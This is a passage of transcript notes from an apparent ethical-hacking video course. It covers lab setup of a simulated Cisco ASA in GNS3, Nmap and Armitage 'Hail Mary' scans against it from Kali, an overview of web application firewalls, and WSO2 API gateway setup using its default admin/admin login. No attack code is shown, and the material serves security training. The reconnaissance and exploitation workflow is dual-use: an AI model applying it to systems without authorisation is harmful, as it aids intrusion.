> **[5:55](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=355)** From the secure enclave, I can ping out to the DMZ.
>
> **[6:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=362)** There's much more to the ASA, including the ASA's threat detection capability which can be configured through the threat detection command.
>
> **[6:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=370)** We can get more information on this with context specific help.
>
> **[6:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=380)** I'll leave the ASA and GNS3 here for the moment, but for more advanced testing, there's a lot more to learn about this kind of perimeter defense.
>
> **[6:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/simulate-the-asa-firewall?u=76281980&t=388)** As a tester, being aware of the complexity of configuring such devices allows you to probe for weaknesses in areas that may be overlooked by network architects.

> [!info]- Semantic Content
>
> **Env Vars:** asa (20), dmz (11), qemu (2), gns3 (2), asa01 (1)
> **Code Keywords:** interface (3), let (2), pass (2), default. (1), default, (1)
> **Prerequisites:** configure (4), setup (3), set up (1)
> **Versions:** 192.168.1 (3), 8.42 (1), 10.0.0 (1)
> **UI Navigation:** select the (3), navigate to (1), open the (1)
> **CLI Commands:** make (1)
> **Exercise Files:** template (1)
> **Definitions:** is an  (1)

#### Integrate Kali into GNS3
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=0)** - [Instructor] We can configure VirtualBox hosts into our GNS3 network.
>
> **[0:04](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=4)** And this means that, amongst other things, we can use Kali to test any network or security devices that we might have configured.
>
> **[0:11](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=11)** Let's add a Kali testing system to our ASA network.
>
> **[0:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=15)** You may find, with some images downloaded from unofficial sources, that even with the right memory, the configuration does not persist across reboots.
>
> **[0:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=24)** This entails reentering the configuration for each session.
>
> **[0:27](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=27)** It's preferable, of course, to obtain official images, and you won't encounter this problem.
>
> **[0:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=32)** First of all, let's see how we set up GNS3 VirtualBox image.
>
> **[0:36](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=36)** The first thing to do is to right-click on the current Kali system, and select Clone.
>
> **[0:42](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=42)** I'll call this GNS3 Kali.
>
> **[0:49](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=49)** This takes a little while, so we'll come back to this when the clone's finished.
>
> **[0:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=53)** Okay, I have one adjustment to make to GNS3 Kali.
>
> **[0:57](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=57)** I need to set Adaptor One to Not Attached, because GNS3 needs to reset the configuration as a UDP tunnel when it starts up Kali.
>
> **[1:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=68)** Okay, we're ready to go.
>
> **[1:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=70)** Back in GNS3, we need to select Edit Preferences, and then select VirtualBox VMs.
>
> **[1:16](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=76)** I'll click New, and GNS3 connects to VirtualBox, and generates a list of the VirtualBox hosts.
>
> **[1:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=85)** We'll select GNS3 Kali.
>
> **[1:30](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=90)** I'll select Edit, and change its name in GNS3 to just Kali.
>
> **[1:35](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=95)** The General Settings can stay exactly as they are, as can the Network Settings.
>
> **[1:41](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=101)** Okay.
>
> **[1:46](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=106)** I'll drag Kali onto the workspace, and I'll connect it to the ASA.
>
> **[1:55](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=115)** Okay, let's start the whole network.
>
> **[1:59](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=119)** This will bring up the devices in the network design, and it will automatically start Kali within VirtualBox.
>
> **[2:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=126)** We need to configure the interface on the ASA, and once Kali's running, we then need to configure its IP address.
>
> **[2:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=135)** I'll start the ASA Console to configure a public interface.
>
> **[2:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=138)** I'll use Interface Zero, and configure this in the ASA as the Outside Zone.
>
> **[2:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=144)** I'll make up an IP address for the public network,
>
> **[2:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=152)** and we'll write the configuration bank.
>
> **[2:36](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=156)** Now we're in GNS3 Kali, we can set the IP address to match the network on the ASA.
>
> **[2:43](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=163)** The ASA has an IP address of 176.23.1.15, so for simplicity, let's set Kali to 176.23.1.16, and bring up the interface.
>
> **[2:59](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=179)** We can now Ping the public interface of the ASA.
>
> **[3:09](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=189)** If you have problems getting Ping to work, you may want to wait a minute or so to let it synchronize.
>
> **[3:14](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=194)** Failing that, you may need to take down your network and start it up again.
>
> **[3:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=198)** GNS3 can sometimes be a little fussy when first introducing Kali, but once settled it works well.
>
> **[3:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=204)** We can now run Nmap against the ASA.
>
> **[3:30](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=210)** We can see that all the ports are filtered.
>
> **[3:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=213)** There's nothing to see, and Nmap can't identify the operating system.
>
> **[3:38](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=218)** Let's start Armitage and see if we have any more luck with that.
>
> **[3:41](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=221)** We first need to start Postgres.
>
> **[3:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=232)** I'll add a new host 176.23.1.15, and set its operating system to Cisco IOS.
>
> **[4:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=248)** I'm not going to be subtle, nor quiet, I'll run Hail Mary.
>
> **[4:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=260)** Okay, on our simple configuration, we can't find open services, and there's no exploitable vulnerabilities detected.
>
> **[4:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=268)** I'll leave the ASA in GNS3 here for the moment, but for more advanced testing, there's a lot more to learn about this kind of perimeter defense.
>
> **[4:36](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/integrate-kali-into-gns3?u=76281980&t=276)** As a tester, being aware of the complexity of configuring such devices allows you to probe for weaknesses in areas that may be overlooked by network architects.

> [!info]- Semantic Content
>
> **Env Vars:** gns3 (12), asa (10), udp (1), ios (1)
> **Code Keywords:** let (6), interface (5), public (3), while, (1), new, (1)
> **Prerequisites:** configure (5), set up (1)
> **CLI Commands:** find (2), make (2)
> **Versions:** 176.23.1 (3)
> **UI Navigation:** right-click (1)
> **Definitions:** means that (1)
> **Speakers:** - [instructor] (1)


### 4. Special Purpose Perimeter Devices

#### Understand Web Application Firewalls
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=0)** - [Instructor] Web Application Firewalls or WAFs are specialized devices which understand web traffic and can provide a high level of protection against the common web attacks.
>
> **[0:11](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=11)** They were developed in order to help protect and filter out any malicious attacks at the application layer rather than monitoring traffic at the network layer as do traditional firewalls.
>
> **[0:22](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=22)** They were typically set in between a traditional firewall in the web server and may be integrated into intelligent load balancers.
>
> **[0:30](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=30)** A WAF will constantly monitor all inbound and outbound web traffic and by analyzing the traffic will block hackers, bots or spam from reaching the website.
>
> **[0:41](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=41)** The monitoring is typically guided by access control lists customized to the components of HTTP messages as the WAF has to monitor HTTPS as well as HTTP traffic and WSS as well as WS.
>
> **[0:56](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=56)** It'll break SSL encryption as part of its inspection process.
>
> **[1:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=61)** WAFs can be delivered as hardware appliances, software applications or cloud services.
>
> **[1:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=68)** They include not only malware signatures but also non-signature based logic to detect anomalous behavior such as protocol misuse.
>
> **[1:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=77)** They are considered to be simple solutions to install as they need little more than a DNS change to route traffic through them and their rules are typically provided by their vendor.
>
> **[1:29](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=89)** Imperva provides one of the leading commercial WAF appliances with its SecureSphere product.
>
> **[1:35](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=95)** SecureSphere not only monitors for attacks based on its global intelligence feeds but it also learns the normal characteristics of the applications it protects to better detect anomalies.
>
> **[1:46](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=106)** As with any behavioral monitoring solution, a WAF needs to deliver low or zero false positive results and very low false negative results in order to be an effective solution.
>
> **[1:57](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=117)** A number of other commercial solutions exist with similar features.
>
> **[2:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=121)** Amazon Web Services provides a cloud-based WAF solution with an option for load balancer integration and with an API to enable integration with customer applications.
>
> **[2:12](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=132)** Microsoft has also moved into the WAF space in its Azure Cloud Service with WAF functionality based on ModSecurity and the OWASP rule set being included in the Azure application gateway.
>
> **[2:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=145)** Cloudflare runs an integrated WAF as part of its service providing either basic WAF or advance WAF depending upon the service type.
>
> **[2:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=154)** AQTRONiX provides a good example of an open source WAF with its WebKnight product.
>
> **[2:39](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=159)** This works with IIS to provide traffic filtering and it can run in logging mode only to enable its effectiveness to be tested prior to running live.
>
> **[2:49](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=169)** ModSecurity is another well-known open source WAF developed by OWASP and supported by OWASP and Trustwave for all sets.
>
> **[2:57](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=177)** It is traditionally operated as an embedded apache module but is now available also for IIS.
>
> **[3:03](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=183)** It operates inside a web server protecting it as an integral part of the server.
>
> **[3:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=188)** It operates using a combination of rules and anomaly detection.
>
> **[3:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=193)** It runs through five phases of analysis of a message starting with the request header and progressing through request body, response header and then body, and finally logging.
>
> **[3:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=205)** By running this is as a dedicated apache reverse proxy, it can be deployed in front of other web servers or applications as a discrete product.
>
> **[3:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=214)** As with any defensive systems, the tester needs to be able to detect the presence of a WAF in lined with the target.
>
> **[3:40](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-web-application-firewalls?u=76281980&t=220)** WAFs have their own characteristics with some using their own cookies or changing headers and it's useful to build up knowledge of these characteristics.

> [!info]- Semantic Content
>
> **Env Vars:** waf (13), owasp (3), http (2), iis (2), https (1)
> **CLI Commands:** apache (2)
> **Code Keywords:** type. (1), module (1)
> **Analogies:** such as (1)
> **Prerequisites:** install (1)
> **Speakers:** - [instructor] (1)

#### Protect API services with the WSO2 gateway
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=0)** - [Instructor] Contemporary application development is a far cry from the early days of software development where traditional procedural and object-oriented languages delivered monolithic solutions.
>
> **[0:11](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=11)** Nowadays, applications are increasingly being delivered as micro-services often linked into an Agile delivery approach where the lines between development, test, and transition to production are blurred.
>
> **[0:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=24)** The Cloud Foundry application's droplets approach is an example of how micro-services can be delivered.
>
> **[0:30](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=30)** The cry of the day is fail fast, learn quickly, which indicates the role of identifying issues has extended from development to the users.
>
> **[0:40](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=40)** While this may be a reasonable approach from a business functionality perspective, it has some significant implications when failing involves security.
>
> **[0:50](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=50)** Our adversaries have a different war cry.
>
> **[0:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=52)** Scan fast, penetrate quicker.
>
> **[0:54](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=54)** And so pen testers are now working in the dynamically changing environment where a test one day may not be valid the next and pen testing is increasingly becoming a very agile sport.
>
> **[1:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=67)** Web services consist not only of web portals, but also API interfaces, which enable an external party to access data directly for use in their applications.
>
> **[1:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=78)** The interface is often accessed using SOAP or JSON data objects.
>
> **[1:23](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=83)** A sandpit environment, which allows external developers to test their applications against specific API test data is also often delivered as part of an enterprise portal.
>
> **[1:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=93)** The Ergast site provides an example of this with the API being accessed through a simple URL.
>
> **[1:39](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=99)** Let's try this.
>
> **[1:40](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=100)** I'll enter a couple of example URL calls and we can see the results displayed in web format.
>
> **[1:47](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=107)** This is obviously a portal-based API call, but we can also request this programmatically using a JSON extension as follows.
>
> **[1:57](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=117)** The result is now a JSON stream, which can be processed in an external application.
>
> **[2:03](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=123)** Unfortunately, these interfaces provide a significant opportunity for errors to occur, as we've already experienced in the Internet of Things.
>
> **[2:12](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=132)** In this case, the IoT devices were able to be misused to deliver a denial of service attack.
>
> **[2:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=139)** Agile development deployment solutions such as Jenkins acknowledge these issues and have enabled integration of automated security testing as part of their deployment pipeline in order to identify and defeat the basic security flaws in code.
>
> **[2:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=154)** API gateways are often used as proxies for applications, providing another layer of operational security monitoring to prevent data-driven attacks such as cross-site scripting.
>
> **[2:46](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=166)** These come in both commercial and open source solutions, as well as infrastructure products and cloud services.
>
> **[2:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=172)** We'll concentrate on the open source WSO2 gateway shown here, which I've already downloaded.
>
> **[2:58](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=178)** The basic context for an API gateway is to mediate the traffic between an API subscriber and the backend micro-services that they can call.
>
> **[3:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=187)** However, it will typically also provide either through the API or in an associated portal access, a catalog of API calls, electronic documentation for the API request, subscriber management, and provision of API keys to subscribers.
>
> **[3:23](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=203)** These are all testing targets.
>
> **[3:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=205)** The WSO2 API manager downloads as a zip file and will run in either Windows or Linux.
>
> **[3:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=212)** I've downloaded it into my Ubuntu system and extracted its contents into /user/share and for convenience, renamed its top folder to WSO2.
>
> **[3:43](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=223)** You'll also need to have Java running and the Java_home variable set.
>
> **[3:49](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=229)** Running the server may cause blocking condition retriever errors and so for the purposes of this course, we'll avoid this by editing the api-manager.xml configuration file to change the EnableAdvanceThrottling setting to false.
>
> **[4:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=257)** Okay, we can now start up the WSO2 server.
>
> **[4:26](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=266)** This takes a while to start, about three minutes for me.
>
> **[4:30](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=270)** So we'll come back to it shortly.
>
> **[4:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=272)** Okay, we've now started and URLs for the three main portals, the management console, the API publisher, and the API store, are shown as 10.0.2.19, with a port of 9443.
>
> **[4:47](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=287)** Let's take a note of these and hop over to our Kali system.
>
> **[4:51](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=291)** The first thing we'll do is to run nmap.
>
> **[4:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=293)** Let's see what ports are exposed and what services they're running.
>
> **[4:58](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=298)** We can see two ports, 9999, showing as a Java RMI service and 11111 showing as VCE.
>
> **[5:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=307)** Nevertheless, we know we can connect using port 9443 as an HTTPS access.
>
> **[5:16](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=316)** Let's go into the management portal.
>
> **[5:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=318)** We'll have to work our way through an invalid certificate as we go.
>
> **[5:27](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=327)** We eventually gain access to the management portal and we can use the default login of admin, admin to get access to the administration console.
>
> **[5:38](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=338)** One of our first tasks, particularly if we intend to enable remote management, will be to add another user and to secure the admin credentials.
>
> **[5:47](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=347)** I'll click on Add under Users and Roles and add myself as a user.
>
> **[5:56](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=356)** Okay, we can see we now have two users, Admin and Malcolm.
>
> **[6:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=361)** I'll assign Malcolm a role of admin and publisher, and update.
>
> **[6:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=368)** As we scroll down the console, we can see that there's a lot of detail management that can be done.
>
> **[6:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=377)** Okay, I'll sign out and we'll go back to the entry screen.
>
> **[6:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=380)** Let's look at the publisher portal.
>
> **[6:26](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=386)** I'll log in as Malcolm.
>
> **[6:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=388)** As we can see, there are no APIs published yet.
>
> **[6:31](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=391)** Let's create one.
>
> **[6:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=393)** We can use the existing CDYNE service, which provides a phone number search portal.
>
> **[6:38](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=398)** Let's look at it.
>
> **[6:39](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=399)** We can see this provides a response to a URL-based API call.
>
> **[6:44](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=404)** I don't have an API definition already available, so I'll select the Design New API and I'll start creating it.
>
> **[6:55](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=415)** I'll call this PhoneView and use the same for the context and set it to version 0.1.
>
> **[7:04](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=424)** I'll now select the Get command and I'll put in the URL pattern.
>
> **[7:14](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=434)** I'll click Get and add two parameters.
>
> **[7:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/protect-api-services-with-the-wso2-gateway?u=76281980&t=440)** And now, I can go implement it.
>
